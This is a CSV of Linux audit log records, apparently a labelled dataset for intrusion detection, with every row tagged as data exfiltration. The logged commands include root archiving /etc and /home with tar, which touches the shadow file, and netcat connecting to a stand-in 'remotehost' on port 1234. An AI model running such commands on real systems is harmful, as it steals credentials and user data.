label,LANG,LANGUAGE,LC_ADDRESS,LC_ALL,LC_COLLATE,LC_CTYPE,LC_IDENTIFICATION,LC_MEASUREMENT,LC_MESSAGES,LC_MONETARY,LC_NAME,LC_NUMERIC,LC_PAPER,LC_TELEPHONE,LC_TIME,PATH,TERM,a0,a1,a10,a11,a12,a13,a14,a15,a16,a17,a18,a19,a2,a20,a21,a22,a23,a24,a25,a26,a27,a28,a29,a3,a30,a4,a5,a6,a7,a8,a9,acct,addr,arch,argc,auid,cap_fe,cap_fi,cap_fp,cap_frootid,cap_fver,cmd,comm,cwd,dev,egid,euid,exe,exit,fsgid,fsuid,gid,grantors,hostname,id,inode,item,items,key,laddr,lport,mode,msg,name,nametype,ogid,op,ouid,path,pid,ppid,proctitle,rdev,res,saddr,saddr_fam,ses,sgid,subj,success,suid,syscall,terminal,tty,type,uid,unit
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,root,?,,,ubuntu,,,,,,,,,,,,/usr/bin/sudo,,,,,"pam_permit,pam_localuser""",?,,,,,,,,,audit(10/13/2025 09:17:32.139:823859),,,,"PAM:accounting,""",,,21707,,,,success,,,3,,unconfined,,,,/dev/pts/1,,USER_ACCT,root,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,root,?,,,ubuntu,,,,,,,,,,,,/usr/bin/sudo,,,,,"pam_permit,pam_cap""",?,,,,,,,,,audit(10/13/2025 09:17:32.151:823861),,,,"PAM:setcred,""",,,21707,,,,success,,,3,,unconfined,,,,/dev/pts/1,,CRED_REFR,root,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,root,?,,,ubuntu,,,,,,,,,,,,/usr/bin/sudo,,,,,"pam_limits,pam_env,pam_env,pam_permit,pam_umask,pam_unix""",?,,,,,,,,,audit(10/13/2025 09:17:32.155:823862),,,,"PAM:session_open,""",,,21707,,,,success,,,3,,unconfined,,,,/dev/pts/1,,USER_START,root,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,root,?,,,ubuntu,,,,,,,,,,,,/usr/bin/sudo,,,,,"pam_permit,pam_localuser""",?,,,,,,,,,audit(10/13/2025 09:17:32.139:823859),,,,"PAM:accounting,""",,,21707,,,,success,,,3,,unconfined,,,,/dev/pts/1,,USER_ACCT,root,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,root,?,,,ubuntu,,,,,,,,,,,,/usr/bin/sudo,,,,,"pam_permit,pam_cap""",?,,,,,,,,,audit(10/13/2025 09:17:32.151:823861),,,,"PAM:setcred,""",,,21707,,,,success,,,3,,unconfined,,,,/dev/pts/1,,CRED_REFR,root,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,root,?,,,ubuntu,,,,,,,,,,,,/usr/bin/sudo,,,,,"pam_limits,pam_env,pam_env,pam_permit,pam_umask,pam_unix""",?,,,,,,,,,audit(10/13/2025 09:17:32.155:823862),,,,"PAM:session_open,""",,,21707,,,,success,,,3,,unconfined,,,,/dev/pts/1,,USER_START,root,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,root,?,,,ubuntu,,,,,,,,,,,,/usr/bin/sudo,,,,,"pam_limits,pam_env,pam_env,pam_permit,pam_umask,pam_unix""",?,,,,,,,,,audit(10/13/2025 09:17:32.424:823863),,,,"PAM:session_close,""",,,21707,,,,success,,,3,,unconfined,,,,/dev/pts/1,,USER_END,root,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,root,?,,,ubuntu,,,,,,,,,,,,/usr/bin/sudo,,,,,pam_permit,?,,,,,,,,,audit(10/13/2025 09:17:32.428:823864),,,,PAM:setcred,,,21707,,,,success,,,3,,unconfined,,,,/dev/pts/1,,CRED_DISP,root,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,audit(10/13/2025 09:17:33.002:823865),,,,,,,,,tar -czf /tmp/data.tar.gz /etc /home,,,,,,,,,,,,,PROCTITLE,,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,none,none,0,0,,,,08:02,,,,,,,,,,,1853150,1,,,,,"file,755",audit(10/13/2025 09:17:33.002:823865),/lib64/ld-linux-x86-64.so.2,NORMAL,root,,root,,,,,00:00,,,,,,,,,,,,PATH,,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,none,none,0,0,,,,08:02,,,,,,,,,,,1836442,0,,,,,"file,755",audit(10/13/2025 09:17:33.002:823865),/usr/bin/tar,NORMAL,root,,root,,,,,00:00,,,,,,,,,,,,PATH,,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,/home/ubuntu,,,,,,,,,,,,,,,,,,,audit(10/13/2025 09:17:33.002:823865),,,,,,,,,,,,,,,,,,,,,,CWD,,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,tar,-czf,,,,,,,,,,,/tmp/data.tar.gz,,,,,,,,,,,/etc,,/home,,,,,,,,,5,,,,,,,,,,,,,,,,,,,,,,,,,,,,audit(10/13/2025 09:17:33.002:823865),,,,,,,,,,,,,,,,,,,,,,EXECVE,,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,0x5c9f01296df0,0x5c9f0128e910,,,,,,,,,,,0x5c9f0128b440,,,,,,,,,,,0x5c9f0128dbf0,,,,,,,,,,x86_64,,ubuntu,,,,,,,tar,,,root,root,/usr/bin/tar,0,root,root,root,,,,,,2,DATA_EXFILTRATION,,,,audit(10/13/2025 09:17:33.002:823865),,,,,,,21712,20852,,,,,,3,root,unconfined,yes,root,execve,,pts1,SYSCALL,root,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,audit(10/13/2025 09:17:33.328:823866),,,,,,,,,tar -czf /tmp/data.tar.gz /etc /home,,,,,,,,,,,,,PROCTITLE,,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,none,none,0,0,,,,08:02,,,,,,,,,,,2132944,0,,,,,"file,640",audit(10/13/2025 09:17:33.328:823866),shadow,NORMAL,shadow,,root,,,,,00:00,,,,,,,,,,,,PATH,,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,/home/ubuntu,,,,,,,,,,,,,,,,,,,audit(10/13/2025 09:17:33.328:823866),,,,,,,,,,,,,,,,,,,,,,CWD,,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,0x3,0x64c067a0f9d7,,,,,,,,,,,O_RDONLY|O_NOCTTY|O_NONBLOCK|O_NOFOLLOW|O_CLOEXEC,,,,,,,,,,,0x0,,,,,,,,,,x86_64,,ubuntu,,,,,,,tar,,,root,root,/usr/bin/tar,5,root,root,root,,,,,,1,PRIVILEGE_ESCALATION,,,,audit(10/13/2025 09:17:33.328:823866),,,,,,,21712,20852,,,,,,3,root,unconfined,yes,root,openat,,pts1,SYSCALL,root,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,audit(10/13/2025 09:17:33.710:823867),,,,,,,,,tar -czf /tmp/data.tar.gz /etc /home,,,,,,,,,,,,,PROCTITLE,,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,none,none,0,0,,,,08:02,,,,,,,,,,,2097529,0,,,,,"file,644",audit(10/13/2025 09:17:33.710:823867),crontab,NORMAL,root,,root,,,,,00:00,,,,,,,,,,,,PATH,,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,/home/ubuntu,,,,,,,,,,,,,,,,,,,audit(10/13/2025 09:17:33.710:823867),,,,,,,,,,,,,,,,,,,,,,CWD,,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,0x3,0x64c067a10028,,,,,,,,,,,O_RDONLY|O_NOCTTY|O_NONBLOCK|O_NOFOLLOW|O_CLOEXEC,,,,,,,,,,,0x0,,,,,,,,,,x86_64,,ubuntu,,,,,,,tar,,,root,root,/usr/bin/tar,5,root,root,root,,,,,,1,PERSISTENCE,,,,audit(10/13/2025 09:17:33.710:823867),,,,,,,21712,20852,,,,,,3,root,unconfined,yes,root,openat,,pts1,SYSCALL,root,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,audit(10/13/2025 09:17:33.844:823868),,,,,,,,,tar -czf /tmp/data.tar.gz /etc /home,,,,,,,,,,,,,PROCTITLE,,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,none,none,0,0,,,,08:02,,,,,,,,,,,2097184,0,,,,,"dir,755",audit(10/13/2025 09:17:33.844:823868),cron.d,NORMAL,root,,root,,,,,00:00,,,,,,,,,,,,PATH,,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,/home/ubuntu,,,,,,,,,,,,,,,,,,,audit(10/13/2025 09:17:33.844:823868),,,,,,,,,,,,,,,,,,,,,,CWD,,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,0x3,0x64c067a1022a,,,,,,,,,,,O_RDONLY|O_NOCTTY|O_NONBLOCK|O_NOFOLLOW|O_CLOEXEC,,,,,,,,,,,0x0,,,,,,,,,,x86_64,,ubuntu,,,,,,,tar,,,root,root,/usr/bin/tar,5,root,root,root,,,,,,1,PERSISTENCE,,,,audit(10/13/2025 09:17:33.844:823868),,,,,,,21712,20852,,,,,,3,root,unconfined,yes,root,openat,,pts1,SYSCALL,root,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,audit(10/13/2025 09:17:33.845:823869),,,,,,,,,tar -czf /tmp/data.tar.gz /etc /home,,,,,,,,,,,,,PROCTITLE,,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,none,none,0,0,,,,08:02,,,,,,,,,,,2099129,0,,,,,"file,644",audit(10/13/2025 09:17:33.845:823869),sysstat,NORMAL,root,,root,,,,,00:00,,,,,,,,,,,,PATH,,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,/home/ubuntu,,,,,,,,,,,,,,,,,,,audit(10/13/2025 09:17:33.845:823869),,,,,,,,,,,,,,,,,,,,,,CWD,,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,0x5,0x64c067a372b0,,,,,,,,,,,O_RDONLY|O_NOCTTY|O_NONBLOCK|O_NOFOLLOW|O_CLOEXEC,,,,,,,,,,,0x0,,,,,,,,,,x86_64,,ubuntu,,,,,,,tar,,,root,root,/usr/bin/tar,6,root,root,root,,,,,,1,PERSISTENCE,,,,audit(10/13/2025 09:17:33.845:823869),,,,,,,21712,20852,,,,,,3,root,unconfined,yes,root,openat,,pts1,SYSCALL,root,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,audit(10/13/2025 09:17:33.845:823870),,,,,,,,,tar -czf /tmp/data.tar.gz /etc /home,,,,,,,,,,,,,PROCTITLE,,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,none,none,0,0,,,,08:02,,,,,,,,,,,2099128,0,,,,,"file,644",audit(10/13/2025 09:17:33.845:823870),e2scrub_all,NORMAL,root,,root,,,,,00:00,,,,,,,,,,,,PATH,,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,/home/ubuntu,,,,,,,,,,,,,,,,,,,audit(10/13/2025 09:17:33.845:823870),,,,,,,,,,,,,,,,,,,,,,CWD,,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,0x5,0x64c067a372b8,,,,,,,,,,,O_RDONLY|O_NOCTTY|O_NONBLOCK|O_NOFOLLOW|O_CLOEXEC,,,,,,,,,,,0x0,,,,,,,,,,x86_64,,ubuntu,,,,,,,tar,,,root,root,/usr/bin/tar,6,root,root,root,,,,,,1,PERSISTENCE,,,,audit(10/13/2025 09:17:33.845:823870),,,,,,,21712,20852,,,,,,3,root,unconfined,yes,root,openat,,pts1,SYSCALL,root,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,audit(10/13/2025 09:17:33.845:823871),,,,,,,,,tar -czf /tmp/data.tar.gz /etc /home,,,,,,,,,,,,,PROCTITLE,,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,none,none,0,0,,,,08:02,,,,,,,,,,,2099126,0,,,,,"file,644",audit(10/13/2025 09:17:33.845:823871),.placeholder,NORMAL,root,,root,,,,,00:00,,,,,,,,,,,,PATH,,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,/home/ubuntu,,,,,,,,,,,,,,,,,,,audit(10/13/2025 09:17:33.845:823871),,,,,,,,,,,,,,,,,,,,,,CWD,,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,0x5,0x64c067a372c4,,,,,,,,,,,O_RDONLY|O_NOCTTY|O_NONBLOCK|O_NOFOLLOW|O_CLOEXEC,,,,,,,,,,,0x0,,,,,,,,,,x86_64,,ubuntu,,,,,,,tar,,,root,root,/usr/bin/tar,6,root,root,root,,,,,,1,PERSISTENCE,,,,audit(10/13/2025 09:17:33.845:823871),,,,,,,21712,20852,,,,,,3,root,unconfined,yes,root,openat,,pts1,SYSCALL,root,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,audit(10/13/2025 09:17:33.845:823872),,,,,,,,,tar -czf /tmp/data.tar.gz /etc /home,,,,,,,,,,,,,PROCTITLE,,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,none,none,0,0,,,,08:02,,,,,,,,,,,2099127,0,,,,,"file,644",audit(10/13/2025 09:17:33.845:823872),anacron,NORMAL,root,,root,,,,,00:00,,,,,,,,,,,,PATH,,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,/home/ubuntu,,,,,,,,,,,,,,,,,,,audit(10/13/2025 09:17:33.845:823872),,,,,,,,,,,,,,,,,,,,,,CWD,,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,0x5,0x64c067a372d1,,,,,,,,,,,O_RDONLY|O_NOCTTY|O_NONBLOCK|O_NOFOLLOW|O_CLOEXEC,,,,,,,,,,,0x0,,,,,,,,,,x86_64,,ubuntu,,,,,,,tar,,,root,root,/usr/bin/tar,6,root,root,root,,,,,,1,PERSISTENCE,,,,audit(10/13/2025 09:17:33.845:823872),,,,,,,21712,20852,,,,,,3,root,unconfined,yes,root,openat,,pts1,SYSCALL,root,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,root,?,,,ubuntu,,,,,,,,,,,,/usr/bin/sudo,,,,,"pam_permit,pam_localuser""",?,,,,,,,,,audit(10/13/2025 09:19:09.756:823875),,,,"PAM:accounting,""",,,21729,,,,success,,,3,,unconfined,,,,/dev/pts/1,,USER_ACCT,root,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,root,?,,,ubuntu,,,,,,,,,,,,/usr/bin/sudo,,,,,"pam_permit,pam_cap""",?,,,,,,,,,audit(10/13/2025 09:19:09.771:823877),,,,"PAM:setcred,""",,,21729,,,,success,,,3,,unconfined,,,,/dev/pts/1,,CRED_REFR,root,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,root,?,,,ubuntu,,,,,,,,,,,,/usr/bin/sudo,,,,,"pam_limits,pam_env,pam_env,pam_permit,pam_umask,pam_unix""",?,,,,,,,,,audit(10/13/2025 09:19:09.777:823878),,,,"PAM:session_open,""",,,21729,,,,success,,,3,,unconfined,,,,/dev/pts/1,,USER_START,root,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,audit(10/13/2025 09:19:11.196:823881),,,,,,,,,nc -w 3 remotehost 1234,,,,,,,,,,,,,PROCTITLE,,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,none,none,0,0,,,,08:02,,,,,,,,,,,1853150,1,,,,,"file,755",audit(10/13/2025 09:19:11.196:823881),/lib64/ld-linux-x86-64.so.2,NORMAL,root,,root,,,,,00:00,,,,,,,,,,,,PATH,,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,none,none,0,0,,,,08:02,,,,,,,,,,,1836100,0,,,,,"file,755",audit(10/13/2025 09:19:11.196:823881),/usr/bin/nc,NORMAL,root,,root,,,,,00:00,,,,,,,,,,,,PATH,,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,/home/ubuntu,,,,,,,,,,,,,,,,,,,audit(10/13/2025 09:19:11.196:823881),,,,,,,,,,,,,,,,,,,,,,CWD,,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,nc,-w,,,,,,,,,,,3,,,,,,,,,,,remotehost,,1234,,,,,,,,,5,,,,,,,,,,,,,,,,,,,,,,,,,,,,audit(10/13/2025 09:19:11.196:823881),,,,,,,,,,,,,,,,,,,,,,EXECVE,,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,0x5c9f0128e4d0,0x5c9f0128c5f0,,,,,,,,,,,0x5c9f0128b440,,,,,,,,,,,0x5c9f0128c930,,,,,,,,,,x86_64,,ubuntu,,,,,,,nc,,,root,root,/usr/bin/nc.openbsd,0,root,root,root,,,,,,2,DATA_EXFILTRATION,,,,audit(10/13/2025 09:19:11.196:823881),,,,,,,21734,20852,,,,,,3,root,unconfined,yes,root,execve,,pts1,SYSCALL,root,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,root,?,,,ubuntu,,,,,,,,,,,,/usr/bin/sudo,,,,,"pam_permit,pam_localuser""",?,,,,,,,,,audit(10/13/2025 09:19:45.350:823884),,,,"PAM:accounting,""",,,21747,,,,success,,,3,,unconfined,,,,/dev/pts/1,,USER_ACCT,root,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,root,?,,,ubuntu,,,,,,,,,,,,/usr/bin/sudo,,,,,"pam_permit,pam_cap""",?,,,,,,,,,audit(10/13/2025 09:19:45.377:823886),,,,"PAM:setcred,""",,,21747,,,,success,,,3,,unconfined,,,,/dev/pts/1,,CRED_REFR,root,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,root,?,,,ubuntu,,,,,,,,,,,,/usr/bin/sudo,,,,,"pam_limits,pam_env,pam_env,pam_permit,pam_umask,pam_unix""",?,,,,,,,,,audit(10/13/2025 09:19:45.381:823887),,,,"PAM:session_open,""",,,21747,,,,success,,,3,,unconfined,,,,/dev/pts/1,,USER_START,root,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,root,?,,,ubuntu,,,,,,,,,,,,/usr/bin/sudo,,,,,"pam_permit,pam_localuser""",?,,,,,,,,,audit(10/13/2025 09:19:45.350:823884),,,,"PAM:accounting,""",,,21747,,,,success,,,3,,unconfined,,,,/dev/pts/1,,USER_ACCT,root,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,root,?,,,ubuntu,,,,,,,,,,,,/usr/bin/sudo,,,,,"pam_permit,pam_cap""",?,,,,,,,,,audit(10/13/2025 09:19:45.377:823886),,,,"PAM:setcred,""",,,21747,,,,success,,,3,,unconfined,,,,/dev/pts/1,,CRED_REFR,root,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,root,?,,,ubuntu,,,,,,,,,,,,/usr/bin/sudo,,,,,"pam_limits,pam_env,pam_env,pam_permit,pam_umask,pam_unix""",?,,,,,,,,,audit(10/13/2025 09:19:45.381:823887),,,,"PAM:session_open,""",,,21747,,,,success,,,3,,unconfined,,,,/dev/pts/1,,USER_START,root,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,root,?,,,ubuntu,,,,,,,,,,,,/usr/bin/sudo,,,,,"pam_limits,pam_env,pam_env,pam_permit,pam_umask,pam_unix""",?,,,,,,,,,audit(10/13/2025 09:19:45.760:823888),,,,"PAM:session_close,""",,,21747,,,,success,,,3,,unconfined,,,,/dev/pts/1,,USER_END,root,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,root,?,,,ubuntu,,,,,,,,,,,,/usr/bin/sudo,,,,,pam_permit,?,,,,,,,,,audit(10/13/2025 09:19:45.762:823889),,,,PAM:setcred,,,21747,,,,success,,,3,,unconfined,,,,/dev/pts/1,,CRED_DISP,root,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,audit(10/13/2025 09:19:45.894:823890),,,,,,,,,nc -w 3 remotehost 1234,,,,,,,,,,,,,PROCTITLE,,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,none,none,0,0,,,,08:02,,,,,,,,,,,1853150,1,,,,,"file,755",audit(10/13/2025 09:19:45.894:823890),/lib64/ld-linux-x86-64.so.2,NORMAL,root,,root,,,,,00:00,,,,,,,,,,,,PATH,,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,none,none,0,0,,,,08:02,,,,,,,,,,,1836100,0,,,,,"file,755",audit(10/13/2025 09:19:45.894:823890),/usr/bin/nc,NORMAL,root,,root,,,,,00:00,,,,,,,,,,,,PATH,,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,/home/ubuntu,,,,,,,,,,,,,,,,,,,audit(10/13/2025 09:19:45.894:823890),,,,,,,,,,,,,,,,,,,,,,CWD,,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,nc,-w,,,,,,,,,,,3,,,,,,,,,,,remotehost,,1234,,,,,,,,,5,,,,,,,,,,,,,,,,,,,,,,,,,,,,audit(10/13/2025 09:19:45.894:823890),,,,,,,,,,,,,,,,,,,,,,EXECVE,,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,0x5c9f01291b20,0x5c9f01296070,,,,,,,,,,,0x5c9f0128b440,,,,,,,,,,,0x5c9f012a0d60,,,,,,,,,,x86_64,,ubuntu,,,,,,,nc,,,root,root,/usr/bin/nc.openbsd,0,root,root,root,,,,,,2,DATA_EXFILTRATION,,,,audit(10/13/2025 09:19:45.894:823890),,,,,,,21752,20852,,,,,,3,root,unconfined,yes,root,execve,,pts1,SYSCALL,root,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,?,,,unset,,,,,,,systemd,,,,,/usr/lib/systemd/systemd,,,,,,?,,,,,,,,,audit(10/13/2025 09:20:00.414:823891),,,,,,,1,,,,success,,,unset,,unconfined,,,,?,,SERVICE_START,root,sysstat-collect
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,?,,,unset,,,,,,,systemd,,,,,/usr/lib/systemd/systemd,,,,,,?,,,,,,,,,audit(10/13/2025 09:20:00.414:823892),,,,,,,1,,,,success,,,unset,,unconfined,,,,?,,SERVICE_STOP,root,sysstat-collect
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,root,?,,,ubuntu,,,,,,,,,,,,/usr/bin/sudo,,,,,"pam_permit,pam_localuser""",?,,,,,,,,,audit(10/13/2025 09:20:16.021:823895),,,,"PAM:accounting,""",,,21768,,,,success,,,3,,unconfined,,,,/dev/pts/1,,USER_ACCT,root,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,root,?,,,ubuntu,,,,,,,,,,,,/usr/bin/sudo,,,,,"pam_permit,pam_cap""",?,,,,,,,,,audit(10/13/2025 09:20:16.035:823897),,,,"PAM:setcred,""",,,21768,,,,success,,,3,,unconfined,,,,/dev/pts/1,,CRED_REFR,root,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,root,?,,,ubuntu,,,,,,,,,,,,/usr/bin/sudo,,,,,"pam_limits,pam_env,pam_env,pam_permit,pam_umask,pam_unix""",?,,,,,,,,,audit(10/13/2025 09:20:16.038:823898),,,,"PAM:session_open,""",,,21768,,,,success,,,3,,unconfined,,,,/dev/pts/1,,USER_START,root,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,root,?,,,ubuntu,,,,,,,,,,,,/usr/bin/sudo,,,,,"pam_limits,pam_env,pam_env,pam_permit,pam_umask,pam_unix""",?,,,,,,,,,audit(10/13/2025 09:20:16.358:823899),,,,"PAM:session_close,""",,,21768,,,,success,,,3,,unconfined,,,,/dev/pts/1,,USER_END,root,
